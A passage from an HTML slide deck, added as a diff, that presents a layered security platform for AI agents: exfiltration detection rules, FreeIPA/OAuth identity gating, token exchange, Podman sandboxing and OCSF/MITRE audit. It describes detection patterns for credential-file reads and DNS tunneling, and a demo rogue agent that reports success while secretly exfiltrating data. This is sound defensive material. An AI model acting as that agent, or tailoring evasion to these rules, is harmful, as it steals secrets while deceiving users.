+    <p style="font-size:13px;">skill-audit performs <strong>pattern-matching</strong> over Python AST patterns and regex. It correlates findings across categories — EXFIL-003 and EXFIL-004 fire together because the <em>same file</em> contains both data encoding <em>and</em> outbound network calls. The DNS tunneling rule (EXFIL-006) triggers on <code>socket.getaddrinfo()</code> called with dynamically constructed subdomain strings alongside hex encoding. These rules run containerized via the RHEL Security Toolkit image on Quay.</p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- SLIDE 5: Layer 2 — Identity Gate -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="slide" data-index="4">
+  <h2><span class="accent-identity">Layer 2</span> — Identity Gate (FreeIPA + ahdapa)</h2>
+  <p>Even if an agent passes assessment, it cannot obtain a token without a registered identity. <strong>ahdapa</strong> is an OAuth 2.0 / OIDC IdP that integrates with FreeIPA's HBAC engine for policy enforcement.</p>
+
+  <div class="svg-container">
+    <svg viewBox="0 0 780 260" width="100%" style="max-width:780px;">
+      <!-- Agent -->
+      <rect x="20" y="90" width="120" height="50" rx="8" fill="#16162a" stroke="#2a2a4e" stroke-width="1.5"/>
+      <text x="80" y="115" text-anchor="middle" fill="#e0e0e0" font-size="12" font-weight="600">Agent</text>
+      <text x="80" y="132" text-anchor="middle" fill="#888" font-size="10">requests token</text>
+
+      <!-- Arrow to ahdapa -->
+      <line x1="140" y1="115" x2="210" y2="115" stroke="#4ECDC4" stroke-width="1.5" marker-end="url(#arrow-identity)"/>
+      <text x="175" y="108" text-anchor="middle" fill="#888" font-size="9">POST /token</text>
+
+      <!-- ahdapa -->
+      <rect x="210" y="80" width="140" height="70" rx="8" fill="rgba(78,205,196,0.1)" stroke="#4ECDC4" stroke-width="1.5"/>
+      <text x="280" y="108" text-anchor="middle" fill="#4ECDC4" font-size="12" font-weight="700">ahdapa</text>
+      <text x="280" y="124" text-anchor="middle" fill="#888" font-size="10">OAuth2/OIDC IdP</text>
+      <text x="280" y="140" text-anchor="middle" fill="#888" font-size="9">client_id lookup</text>
+
+      <!-- Decision diamond -->
+      <polygon points="440,115 480,85 520,115 480,145" fill="#1e1e2e" stroke="#2a2a4e" stroke-width="1.5"/>
+      <text x="480" y="118" text-anchor="middle" fill="#e0e0e0" font-size="10">registered?</text>
+
+      <!-- Arrow to decision -->
+      <line x1="350" y1="115" x2="440" y2="115" stroke="#4ECDC4" stroke-width="1.5" marker-end="url(#arrow-identity)"/>
+
+      <!-- No path (deny) -->
+      <line x1="480" y1="145" x2="480" y2="210" stroke="#d03b3b" stroke-width="1.5" marker-end="url(#arrow-fail)"/>
+      <text x="500" y="180" fill="#d03b3b" font-size="10">NO</text>
+      <rect x="420" y="210" width="120" height="35" rx="6" fill="rgba(208,59,59,0.15)" stroke="#d03b3b"/>
+      <text x="480" y="232" text-anchor="middle" fill="#d03b3b" font-size="11" font-weight="600">401 invalid_client</text>
+
+      <!-- Yes path to HBAC -->
+      <line x1="520" y1="115" x2="580" y2="115" stroke="#0ca30c" stroke-width="1.5" marker-end="url(#arrow-green)"/>
+      <text x="550" y="108" fill="#0ca30c" font-size="10">YES</text>
+
+      <!-- HBAC check -->
+      <rect x="580" y="80" width="170" height="70" rx="8" fill="rgba(78,205,196,0.08)" stroke="#4ECDC4" stroke-width="1" stroke-dasharray="4"/>
+      <text x="665" y="100" text-anchor="middle" fill="#4ECDC4" font-size="11" font-weight="600">FreeIPA HBAC</text>
+      <text x="665" y="116" text-anchor="middle" fill="#888" font-size="10">LDAP group lookup</text>
+      <text x="665" y="132" text-anchor="middle" fill="#888" font-size="10">host + service check</text>
+      <text x="665" y="144" text-anchor="middle" fill="#888" font-size="9">→ GSSAPI binding</text>
+
+      <!-- HBAC pass -->
+      <line x1="665" y1="150" x2="665" y2="210" stroke="#0ca30c" stroke-width="1.5" marker-end="url(#arrow-green)"/>
+      <rect x="595" y="210" width="140" height="35" rx="6" fill="rgba(12,163,12,0.15)" stroke="#0ca30c"/>
+      <text x="665" y="232" text-anchor="middle" fill="#0ca30c" font-size="11" font-weight="600">ES256 JWT issued</text>
+
+      <!-- Legend -->
+      <text x="20" y="30" fill="#888" font-size="10">Identity Gate Flow — ahdapa token endpoint</text>
+    </svg>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-header">HBAC Rules (Live)</div>
+      <table class="data-table">
+        <thead><tr><th>Rule</th><th>Action</th><th>Scope</th></tr></thead>
+        <tbody>
+          <tr><td><code>agent-enrollment-allow</code></td><td><span class="tag tag-pass">ALLOW</span></td><td>Verified+ agents on <code>bkr3</code> for <code>ahdapa-token</code> service</td></tr>
+          <tr><td><code>agent-deny-unknown</code></td><td><span class="tag tag-deny">DENY</span></td><td>Catch-all block for unregistered agents</td></tr>
+          <tr><td><code>allow_all</code></td><td><span class="tag tag-pass">ALLOW</span></td><td>Default — all users/hosts/services (system logins)</td></tr>
+          <tr><td><code>allow_systemd-user</code></td><td><span class="tag tag-pass">ALLOW</span></td><td>pam_systemd user sessions</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="card">
+      <div class="card-header">Trust Tier → IPA Group Mapping</div>
+      <table class="data-table">
+        <thead><tr><th>Tier</th><th>IPA Group</th><th>Token Access</th></tr></thead>
+        <tbody>
+          <tr><td style="color:var(--pass);">Sovereign</td><td><code>agent-tier-sovereign</code></td><td>Full scope</td></tr>
+          <tr><td style="color:var(--accent-identity);">Verified</td><td><code>agent-tier-verified</code></td><td>Scoped (project:read,write)</td></tr>
+          <tr><td style="color:var(--warn);">Untrusted</td><td><code>agent-tier-untrusted</code></td><td>Read-only</td></tr>
+          <tr><td style="color:var(--fail);">Blocked</td><td><code>agent-tier-blocked</code></td><td>None (HBAC denied)</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- SLIDE 6: ahdapa OIDC Deep Dive -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="slide" data-index="5">
+  <h2><span class="accent-identity">Layer 2b</span> — ahdapa OIDC Deep Dive</h2>
+  <p>ahdapa implements the full OAuth 2.0 / OIDC specification stack, including post-quantum signing algorithms. The <code>.well-known/openid-configuration</code> discovery document exposes these capabilities.</p>
+
+  <div class="grid-2">
+    <div>
+      <div class="card">
+        <div class="card-header">Grant Types Supported</div>
+        <ul style="font-size:13px; padding-left:16px;">
+          <li><code>authorization_code</code> — <span style="color:var(--text-dim);">RFC 6749 §4.1</span></li>
+          <li><code>client_credentials</code> — <span style="color:var(--text-dim);">RFC 6749 §4.4 (agent-to-service)</span></li>
+          <li><code>refresh_token</code> — <span style="color:var(--text-dim);">RFC 6749 §6</span></li>
+          <li><code>urn:ietf:...:device_code</code> — <span style="color:var(--text-dim);">RFC 8628 (DARC enrollment)</span></li>
+          <li><code>urn:ietf:...:token-exchange</code> — <span style="color:var(--text-dim);">RFC 8693 (OBO)</span></li>
+          <li><code>urn:ietf:...:jwt-bearer</code> — <span style="color:var(--text-dim);">RFC 7523</span></li>
+        </ul>
+      </div>
+
+      <div class="card">
+        <div class="card-header">Token Auth Methods (8)</div>
+        <div style="display:flex; flex-wrap:wrap; gap:6px; font-size:12px;">
+          <code style="background:var(--card-alt); padding:2px 6px; border-radius:3px;">client_secret_basic</code>
+          <code style="background:var(--card-alt); padding:2px 6px; border-radius:3px;">client_secret_post</code>
+          <code style="background:var(--card-alt); padding:2px 6px; border-radius:3px;">client_secret_jwt</code>
+          <code style="background:var(--card-alt); padding:2px 6px; border-radius:3px;">private_key_jwt</code>
+          <code style="background:var(--card-alt); padding:2px 6px; border-radius:3px;">tls_client_auth</code>
+          <code style="background:var(--card-alt); padding:2px 6px; border-radius:3px;">self_signed_tls_client_auth</code>
+          <code style="background:rgba(78,205,196,0.15); padding:2px 6px; border-radius:3px; color:var(--accent-identity);">kerberos_client_auth</code>
+          <code style="background:var(--card-alt); padding:2px 6px; border-radius:3px;">none</code>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-header" style="color:var(--accent-exchange);">Signing Algorithms</div>
+        <div style="font-size:12px; line-height:2;">
+          <span style="color:var(--text-dim);">RSA:</span> RS256 RS384 RS512 PS256 PS384 PS512<br>
+          <span style="color:var(--text-dim);">EC:</span> <span style="color:var(--accent-identity); font-weight:600;">ES256</span> ES384 ES512<br>
+          <span style="color:var(--text-dim);">EdDSA:</span> Ed25519 Ed448<br>
+          <span style="color:var(--accent-exchange); font-weight:600;">PQC:</span> <span style="color:var(--accent-exchange);">ML-DSA-44 ML-DSA-65 ML-DSA-87</span>
+        </div>
+      </div>
+    </div>
+
+    <div>
+      <div class="code-label">Decoded JWT — Header (JOSE)</div>
+      <div class="code-block">{
+  <span class="k">"alg"</span>: <span class="s">"ES256"</span>,           <span class="c">// ECDSA P-256 (FIPS 186-5)</span>
+  <span class="k">"typ"</span>: <span class="s">"at+JWT"</span>,          <span class="c">// RFC 9068 access token type</span>
+  <span class="k">"kid"</span>: <span class="s">"8UPsQ_Sl57Q"</span>      <span class="c">// Key ID for JWKS rotation</span>
+}</div>
+
+      <div class="code-label">Decoded JWT — Payload (Claims)</div>
+      <div class="code-block">{
+  <span class="k">"iss"</span>: <span class="s">"https://bkr1.bkr.example.com"</span>,  <span class="c">// Issuer</span>
+  <span class="k">"sub"</span>: <span class="s">"mcp-agent"</span>,                     <span class="c">// Subject (client)</span>
+  <span class="k">"aud"</span>: [<span class="s">"mcp-agent"</span>],                   <span class="c">// Audience</span>
+  <span class="k">"exp"</span>: <span class="n">1791482566</span>,                      <span class="c">// Expires (15 min)</span>
+  <span class="k">"nbf"</span>: <span class="n">1791481666</span>,                      <span class="c">// Not before</span>
+  <span class="k">"iat"</span>: <span class="n">1791481666</span>,                      <span class="c">// Issued at</span>
+  <span class="k">"jti"</span>: <span class="s">"bkr1.../d20dbff3-..."</span>,           <span class="c">// Unique token ID</span>
+  <span class="k">"scope"</span>: <span class="s">""</span>,                             <span class="c">// Scoped by tier</span>
+  <span class="k">"client_id"</span>: <span class="s">"mcp-agent"</span>               <span class="c">// RFC 9068 required</span>
+}</div>
+
+      <div class="card">
+        <div class="card-header">Security Features</div>
+        <ul style="font-size:12px; padding-left:16px;">
+          <li><strong>DPoP</strong> — Sender-constrained tokens (RFC 9449)</li>
+          <li><strong>mTLS</strong> — Certificate-bound access tokens</li>
+          <li><strong>PKCE</strong> — S256 challenge method (RFC 7636)</li>
+          <li><strong>PAR</strong> — Pushed Authorization Requests</li>
+          <li><strong>Resource Indicators</strong> — Audience restriction</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- SLIDE 7: Layer 3 — Token Exchange -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="slide" data-index="6">
+  <h2><span class="accent-exchange">Layer 3</span> — Token Exchange (OBO Daemon + SPIRE)</h2>
+  <p>RFC 8693 On-Behalf-Of exchange converts a broad agent token into a scoped downstream token. The OBO daemon validates against ahdapa and checks IPA group membership via GSSAPI LDAP before issuing.</p>
+
+  <div class="svg-container">
+    <svg viewBox="0 0 820 300" width="100%" style="max-width:820px;">
+      <text x="20" y="24" fill="#888" font-size="10">RFC 8693 Token Exchange Flow</text>
+
+      <!-- Step 1: Agent → ahdapa -->
+      <rect x="20" y="50" width="110" height="44" rx="6" fill="#16162a" stroke="#2a2a4e"/>
+      <text x="75" y="72" text-anchor="middle" fill="#e0e0e0" font-size="11" font-weight="600">Agent</text>
+      <text x="75" y="86" text-anchor="middle" fill="#888" font-size="9">mcp-agent</text>
+
+      <line x1="130" y1="72" x2="200" y2="72" stroke="#4ECDC4" stroke-width="1.5" marker-end="url(#arrow-identity)"/>
+      <text x="165" y="64" text-anchor="middle" fill="#4ECDC4" font-size="9">①</text>
+
+      <rect x="200" y="50" width="120" height="44" rx="6" fill="rgba(78,205,196,0.1)" stroke="#4ECDC4"/>
+      <text x="260" y="72" text-anchor="middle" fill="#4ECDC4" font-size="11" font-weight="600">ahdapa</text>
+      <text x="260" y="86" text-anchor="middle" fill="#888" font-size="9">ES256 JWT issued</text>
+
+      <!-- Step 2: Agent → OBO with subject_token -->
+      <line x1="75" y1="94" x2="75" y2="140" stroke="#A855F7" stroke-width="1.5"/>
+      <line x1="75" y1="140" x2="200" y2="170" stroke="#A855F7" stroke-width="1.5" marker-end="url(#arrow-exchange)"/>
+      <text x="105" y="152" fill="#A855F7" font-size="9">② subject_token</text>
+
+      <!-- OBO Daemon -->
+      <rect x="200" y="140" width="180" height="70" rx="8" fill="rgba(168,85,247,0.1)" stroke="#A855F7" stroke-width="1.5"/>
+      <text x="290" y="162" text-anchor="middle" fill="#A855F7" font-size="12" font-weight="700">OBO Daemon</text>
+      <text x="290" y="178" text-anchor="middle" fill="#888" font-size="10">RFC 8693 :8900</text>
+      <text x="290" y="194" text-anchor="middle" fill="#888" font-size="9">EC P-256 signing (separate key)</text>
+      <text x="290" y="206" text-anchor="middle" fill="#888" font-size="9">kid=PTjxeTUzieThVDyo21_trA</text>
+
+      <!-- OBO → ahdapa introspect -->
+      <line x1="290" y1="140" x2="290" y2="98" stroke="#4ECDC4" stroke-width="1" stroke-dasharray="4" marker-end="url(#arrow-identity)"/>
+      <text x="310" y="120" fill="#4ECDC4" font-size="8">③ /introspect</text>
+
+      <!-- OBO → IPA LDAP -->
+      <rect x="460" y="140" width="150" height="50" rx="6" fill="rgba(78,205,196,0.08)" stroke="#4ECDC4" stroke-width="1" stroke-dasharray="4"/>
+      <text x="535" y="162" text-anchor="middle" fill="#4ECDC4" font-size="11">FreeIPA LDAP</text>
+      <text x="535" y="178" text-anchor="middle" fill="#888" font-size="9">GSSAPI group check</text>
+
+      <line x1="380" y1="165" x2="460" y2="165" stroke="#4ECDC4" stroke-width="1" stroke-dasharray="4" marker-end="url(#arrow-identity)"/>
+      <text x="420" y="158" text-anchor="middle" fill="#4ECDC4" font-size="8">④ memberOf?</text>
+
+      <!-- Scoped token out -->
+      <line x1="290" y1="210" x2="290" y2="250" stroke="#0ca30c" stroke-width="1.5" marker-end="url(#arrow-green)"/>
+      <text x="310" y="236" fill="#0ca30c" font-size="9">⑤</text>
+
+      <rect x="210" y="250" width="160" height="35" rx="6" fill="rgba(12,163,12,0.1)" stroke="#0ca30c"/>
+      <text x="290" y="272" text-anchor="middle" fill="#0ca30c" font-size="11" font-weight="600">Scoped Token</text>
+
+      <!-- SPIRE section -->
+      <rect x="650" y="50" width="150" height="200" rx="8" fill="#16162a" stroke="#0EA5E9" stroke-width="1"/>
+      <text x="725" y="74" text-anchor="middle" fill="#0EA5E9" font-size="12" font-weight="700">SPIRE</text>
+      <text x="725" y="92" text-anchor="middle" fill="#888" font-size="10">X.509 SVIDs</text>
+
+      <text x="665" y="120" fill="#e0e0e0" font-size="10">Workload entries:</text>
+      <text x="670" y="138" fill="#0EA5E9" font-size="9">• obo-daemon</text>
+      <text x="670" y="154" fill="#0EA5E9" font-size="9">• governed-agent</text>
+      <text x="670" y="170" fill="#0EA5E9" font-size="9">• ahdapa</text>
+      <text x="670" y="186" fill="#0EA5E9" font-size="9">• exfil-receiver</text>
+
+      <text x="665" y="210" fill="#888" font-size="8">SPIFFE IDs:</text>
+      <text x="665" y="224" fill="#888" font-size="7.5">spiffe://bkr.example.com/</text>
+      <text x="665" y="236" fill="#888" font-size="7.5">  workload/obo-daemon</text>
+
+      <!-- Dotted line SPIRE ↔ OBO -->
+      <line x1="380" y1="185" x2="650" y2="175" stroke="#0EA5E9" stroke-width="1" stroke-dasharray="6"/>
+      <text x="510" y="194" fill="#0EA5E9" font-size="8">SVID attestation</text>
+    </svg>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-header" style="color:var(--accent-exchange);">OBO Daemon Configuration</div>
+      <div class="code-block"><span class="c">// /etc/ipa-wid/obo/obo.conf</span>
+{
+  <span class="k">"listen"</span>: <span class="s">"0.0.0.0:8900"</span>,
+  <span class="k">"trusted_issuer"</span>: <span class="s">"https://bkr1.bkr.example.com"</span>,
+  <span class="k">"ldap_uri"</span>: <span class="s">"ldap://bkr1.bkr.example.com"</span>,
+  <span class="k">"ldap_auth"</span>: <span class="s">"gssapi"</span>,           <span class="c">// Kerberos LDAP bind</span>
+  <span class="k">"signing_key"</span>: <span class="s">"/var/lib/ipa-wid/obo-signing-key.json"</span>,
+  <span class="k">"signing_alg"</span>: <span class="s">"ES256"</span>            <span class="c">// EC P-256, separate from ahdapa key</span>
+}</div>
+    </div>
+    <div class="card">
+      <div class="card-header">Systemd Hardening</div>
+      <div class="code-block"><span class="c"># ipa-obo-exchange.service</span>
+[Service]
+ProtectSystem=strict      <span class="c"># read-only /usr, /boot, /efi</span>
+ProtectHome=yes           <span class="c"># no access to /home</span>
+PrivateTmp=yes            <span class="c"># isolated /tmp</span>
+NoNewPrivileges=yes       <span class="c"># no privilege escalation</span>
+ReadWritePaths=/var/lib/ipa-wid  <span class="c"># signing key only</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- SLIDE 8: Layer 4 — Runtime Confinement -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="slide" data-index="7">
+  <h2><span class="accent-sandbox">Layer 4</span> — Runtime Confinement (Sandbox)</h2>
+  <p>The sandbox is the last line of defense. Even if assessment missed the pattern and the agent obtained a token, <strong>network isolation</strong> blocks exfiltration at runtime.</p>
+
+  <div class="compare-cols">
+    <div class="compare-col" style="border-color:var(--fail);">
+      <h3 style="color:var(--fail);">Ungoverned (Direct Execution)</h3>
+      <ul style="font-size:13px; padding-left:16px;">
+        <li>Full network access — can reach any endpoint</li>
+        <li>Full filesystem — all credential files readable</li>
+        <li>All environment variables visible (<code>os.environ</code>)</li>
+        <li>No process isolation — shares host PID namespace</li>
+        <li>No resource limits</li>
+      </ul>
+      <hr class="sep">
+      <div class="code-label">Result</div>
+      <div class="code-block" style="border-color:var(--fail);">$ python3 rogue_agent.py --task "set up my project"
+Project initialized successfully!
+  Task: set up my project
+  Files created: 3
+  Dependencies installed: 12
+<span class="c"># ← looks fine, but 5909 bytes exfiltrated</span></div>
+      <div style="text-align:center; margin-top:8px;">
+        <span class="tag tag-fail">EXFIL LOG: 1 entry (5909 bytes)</span>
+      </div>
+    </div>
+    <div class="compare-col" style="border-color:var(--pass);">
+      <h3 style="color:var(--pass);">Sandboxed (Podman / OpenShell)</h3>
+      <div class="code-block" style="font-size:11px;">podman run --rm \
+  <span class="s">--network=none</span>         <span class="c"># no network access</span>
+  <span class="s">--read-only</span>             <span class="c"># immutable rootfs</span>
+  <span class="s">--user 0</span>                <span class="c"># mapped UID</span>
+  <span class="s">--tmpfs /tmp:rw,size=64m</span> <span class="c"># limited scratch</span>
+  -v project:<span class="s">/workspace:ro</span>  <span class="c"># input: read-only</span>
+  -v output:<span class="s">/workspace/out:rw</span> <span class="c"># output: write-only</span>
+  demo-sandbox:latest \
+  python3 governed_agent.py</div>
+      <hr class="sep">
+      <div class="code-label">Result — Governed Agent</div>
+      <div class="code-block" style="border-color:var(--pass);">{
+  <span class="k">"task"</span>: <span class="s">"set up my project"</span>,
+  <span class="k">"project"</span>: { <span class="k">"files"</span>: [{<span class="k">"path"</span>: <span class="s">"main.py"</span>}] },
+  <span class="k">"status"</span>: <span class="s">"initialized"</span>
+}</div>
+      <div style="text-align:center; margin-top:8px;">
+        <span class="tag tag-pass">EXFIL LOG: 0 entries</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-header" style="color:var(--accent-sandbox);">OpenShell Gateway Architecture</div>
+      <ul style="font-size:12px; padding-left:16px;">
+        <li><strong>Containerized gateway</strong> on port 17670 (Quay image)</li>
+        <li><strong>Podman socket driver</strong> — creates sandboxes via host Podman</li>
+        <li><strong>Profile-based policies</strong>: <code>verified.profile</code>, <code>untrusted.profile</code></li>
+        <li><strong>Session isolation</strong> — each agent invocation gets a fresh container</li>
+        <li><strong>No credential passthrough</strong> — sandbox has no access to host credential files</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-header">Why the Rogue "Succeeds" in Sandbox</div>
+      <p style="font-size:12px;">The rogue agent prints <code>"Project initialized successfully!"</code> even inside the sandbox because its <code>exfiltrate()</code> function catches the <code>ConnectionError</code> and returns <code>False</code> silently. The agent was designed to hide its failure — but the exfil log on the server proves nothing was received. The sandbox doesn't need to crash the agent; it just blocks the network.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- SLIDE 9: Layer 5 — Audit & Detection -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="slide" data-index="8">
+  <h2><span class="accent-audit">Layer 5</span> — Audit &amp; Detection</h2>
+  <p>Every enforcement decision produces an OCSF-structured event for compliance audit. Runtime monitoring via Falco and Wazuh catches behavior that static analysis cannot.</p>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-header" style="color:var(--accent-audit);">OCSF Event Taxonomy (v1.4)</div>
+      <table class="data-table">
+        <thead><tr><th>Category</th><th>Events Generated</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><strong>Category 2</strong><br><span style="color:var(--text-dim); font-size:11px;">Security Finding</span></td>
+            <td>Assessment gate scan results — each EXFIL/NET finding becomes an OCSF Security Finding event with severity, MITRE technique ID, and remediation guidance</td>
+          </tr>
+          <tr>
+            <td><strong>Category 3</strong><br><span style="color:var(--text-dim); font-size:11px;">Identity &amp; Access</span></td>
+            <td>Token issuance, HBAC denials, client registration attempts. Each 401 becomes an access-denied event with the requesting client_id and source IP</td>
+          </tr>
+          <tr>
+            <td><strong>Category 6</strong><br><span style="color:var(--text-dim); font-size:11px;">Application Activity</span></td>
+            <td>Sandbox creation, execution, and termination. Network policy violations. Filesystem access attempts outside allowed mounts</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+    <div>
+      <div class="card">
+        <div class="card-header">MITRE ATT&amp;CK Mapping</div>
+        <table class="data-table">
+          <thead><tr><th>Technique</th><th>Detection</th></tr></thead>
+          <tbody>
+            <tr><td><code>T1552.001</code></td><td>EXFIL-002 → credential file reads</td></tr>
+            <tr><td><code>T1048</code></td><td>EXFIL-003/004 → encode + transmit</td></tr>
+            <tr><td><code>T1048.003</code></td><td>EXFIL-006 → DNS tunneling</td></tr>
+            <tr><td><code>T1059.006</code></td><td>skill-audit agentic category</td></tr>
+            <tr><td><code>T1078.003</code></td><td>HBAC enforcement events</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="card">
+        <div class="card-header">Integration Points</div>
+        <ul style="font-size:12px; padding-left:16px;">
+          <li><strong>Wazuh SIEM</strong> — custom decoders + rules for agentic events; 68 alerts in live deployment</li>
+          <li><strong>Falco eBPF</strong> — runtime syscall monitoring for agent swarm behavior</li>
+          <li><strong>OCSF compatibility</strong> — events consumable by AWS Security Lake, Splunk, CrowdStrike Falcon</li>
+          <li><strong>ServiceNow</strong> — automated incident ticket creation on critical findings</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header">Sample OCSF Security Finding Event</div>
+    <div class="code-block">{
+  <span class="k">"class_uid"</span>: <span class="n">2001</span>,                        <span class="c">// Security Finding</span>
+  <span class="k">"category_uid"</span>: <span class="n">2</span>,                       <span class="c">// Findings</span>
+  <span class="k">"severity_id"</span>: <span class="n">4</span>,                        <span class="c">// High</span>
+  <span class="k">"finding"</span>: {
+    <span class="k">"title"</span>: <span class="s">"Credential file access detected"</span>,
+    <span class="k">"uid"</span>: <span class="s">"EXFIL-002"</span>,
+    <span class="k">"types"</span>: [<span class="s">"T1552.001"</span>],
+    <span class="k">"src_url"</span>: <span class="s">"rogue_agent.py:18"</span>
+  },
+  <span class="k">"metadata"</span>: { <span class="k">"product"</span>: { <span class="k">"name"</span>: <span class="s">"RHEL Security Toolkit"</span>, <span class="k">"version"</span>: <span class="s">"0.1.0"</span> } }
+}</div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- SLIDE 10: Trust Tiers Model -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="slide" data-index="9">
+  <h2>Trust Tiers — Differentiated Enforcement</h2>
+  <p>Every agent passes through all five layers, but enforcement intensity varies by trust tier. The tier is determined by the agent's IPA group membership, set during enrollment.</p>
+
+  <table class="data-table" style="margin-bottom:24px;">
+    <thead>
+      <tr>
+        <th>Tier</th>
+        <th>IPA Group</th>
+        <th>Assessment</th>
+        <th>HBAC</th>
+        <th>Token Scope</th>
+        <th>Sandbox Profile</th>
+        <th>Audit Level</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td style="color:var(--pass); font-weight:600;">Sovereign</td>
+        <td><code>agent-tier-sovereign</code></td>
+        <td>Standard scan</td>
+        <td>Full service access</td>
+        <td>Unrestricted</td>
+        <td>Permissive (network allowed)</td>
+        <td>Standard</td>
+      </tr>
+      <tr>
+        <td style="color:var(--accent-identity); font-weight:600;">Verified</td>
+        <td><code>agent-tier-verified</code></td>
+        <td>Standard scan</td>
+        <td>Scoped services</td>
+        <td><code>project:read,write</code></td>
+        <td>Strict (network isolated)</td>
+        <td>Enhanced</td>
+      </tr>
+      <tr>
+        <td style="color:var(--warn); font-weight:600;">Untrusted</td>
+        <td><code>agent-tier-untrusted</code></td>
+        <td>Strict scan + CVE check</td>
+        <td>Minimal services</td>
+        <td><code>read-only</code></td>
+        <td>Full confinement</td>
+        <td>Maximum</td>
+      </tr>
+      <tr>
+        <td style="color:var(--fail); font-weight:600;">Blocked</td>
+        <td><code>agent-tier-blocked</code></td>
+        <td>N/A</td>
+        <td>Denied</td>
+        <td>None</td>
+        <td>N/A</td>
+        <td>Alert on attempt</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>The Gauntlet — Five-Stage Enforcement Pipeline</h3>
+  <div class="gauntlet">
+    <div class="gauntlet-stage" style="border-color:var(--accent-assess);">
+      <div class="stage-name" style="color:var(--accent-assess);">Assessment</div>
+      <div class="stage-detail">skill-audit<br>vuln-scan<br>sandbox-check</div>
+    </div>
+    <div class="gauntlet-arrow">→</div>
+    <div class="gauntlet-stage" style="border-color:var(--accent-identity);">
+      <div class="stage-name" style="color:var(--accent-identity);">Identity</div>
+      <div class="stage-detail">FreeIPA enrollment<br>HBAC check<br>client registration</div>
+    </div>
+    <div class="gauntlet-arrow">→</div>
+    <div class="gauntlet-stage" style="border-color:var(--accent-exchange);">
+      <div class="stage-name" style="color:var(--accent-exchange);">Exchange</div>
+      <div class="stage-detail">ahdapa token<br>OBO delegation<br>scope ceiling</div>
+    </div>
+    <div class="gauntlet-arrow">→</div>
+    <div class="gauntlet-stage" style="border-color:var(--accent-sandbox);">
+      <div class="stage-name" style="color:var(--accent-sandbox);">Confinement</div>
+      <div class="stage-detail">network isolation<br>filesystem scoping<br>resource limits</div>
+    </div>
+    <div class="gauntlet-arrow">→</div>
+    <div class="gauntlet-stage" style="border-color:var(--accent-audit);">
+      <div class="stage-name" style="color:var(--accent-audit);">Audit</div>
+      <div class="stage-detail">OCSF events<br>MITRE mapping<br>SIEM forwarding</div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:16px;">
+    <div class="card-header">Key Design Principle</div>
+    <p style="font-size:13px;">Each layer operates <strong>independently</strong>. A failure at any single layer (assessment missed the pattern, identity was misconfigured, sandbox had a CVE) does not compromise the system — the other four layers still enforce. This is defense-in-depth applied to the AI agent lifecycle, not a single-point-of-failure gate.</p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- SLIDE 11: Post-Quantum Readiness -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="slide" data-index="10">
+  <h2><span class="accent-exchange">Post-Quantum Readiness</span></h2>
+  <p>The platform supports NIST post-quantum signature algorithms today — ML-DSA (FIPS 204) for token signing and certificate issuance, alongside classical algorithms for backward compatibility.</p>
+
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-header" style="color:var(--accent-exchange);">akamu — Mesh Trust CA</div>
+      <ul style="font-size:13px; padding-left:16px;">
+        <li><strong>ML-DSA-65</strong> CA signing key (NIST FIPS 204, Level 3)</li>
+        <li>ECDSA TLS serving certificate (hybrid deployment)</li>
+        <li>ACME protocol — 8 endpoints on port 8443</li>
+        <li>Mesh Trust Certificates for workload identity</li>
+        <li>Automated certificate lifecycle via ACME challenges</li>
+      </ul>
+      <hr class="sep">
+      <div class="code-label">akamu ACME Endpoints</div>
+      <div class="code-block">GET  /acme/directory
+POST /acme/new-nonce
+POST /acme/new-account
+POST /acme/new-order
+POST /acme/authz/{id}
+POST /acme/challenge/{id}
+POST /acme/finalize/{id}
+POST /acme/cert/{id}</div>
+    </div>
+
+    <div class="card">
+      <div class="card-header" style="color:var(--accent-identity);">ahdapa PQC Token Signing</div>
+      <p style="font-size:13px; margin-bottom:12px;">ahdapa supports three ML-DSA parameter sets for JWT signing, alongside classical algorithms. This enables a phased migration path:</p>
+
+      <table class="data-table">
+        <thead><tr><th>Algorithm</th><th>Standard</th><th>Security Level</th><th>Use Case</th></tr></thead>
+        <tbody>
+          <tr><td><code>ML-DSA-44</code></td><td>FIPS 204</td><td>Level 2</td><td>High-volume tokens (smaller signatures)</td></tr>
+          <tr><td><code>ML-DSA-65</code></td><td>FIPS 204</td><td>Level 3</td><td>Standard tokens (recommended)</td></tr>
+          <tr><td><code>ML-DSA-87</code></td><td>FIPS 204</td><td>Level 5</td><td>Long-lived tokens, high-assurance</td></tr>
+        </tbody>
+      </table>
+
+      <hr class="sep">
+      <h3>Migration Path</h3>
